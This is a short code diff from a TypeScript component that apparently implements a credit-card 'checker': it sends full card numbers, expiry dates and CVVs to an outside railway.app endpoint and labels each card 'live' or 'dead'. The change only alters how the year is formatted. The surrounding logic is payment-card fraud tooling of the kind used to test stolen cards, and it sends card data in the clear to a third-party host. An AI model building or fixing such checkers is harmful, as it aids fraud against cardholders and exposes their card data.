@@ -459,7 +459,7 @@ const Gateways = () => {
   // Real API check for YunChi Auth gateway
   const checkCardViaApi = async (cardNumber: string, month: string, year: string, cvv: string): Promise<"live" | "dead" | "unknown"> => {
     try {
-      const cc = `${cardNumber}|${month}|20${year}|${cvv}`;
+      const cc = `${cardNumber}|${month}|${year}|${cvv}`;
       const response = await fetch(`https://stripe-auth-api-production.up.railway.app/api?cc=${encodeURIComponent(cc)}`);
       
       if (!response.ok) {
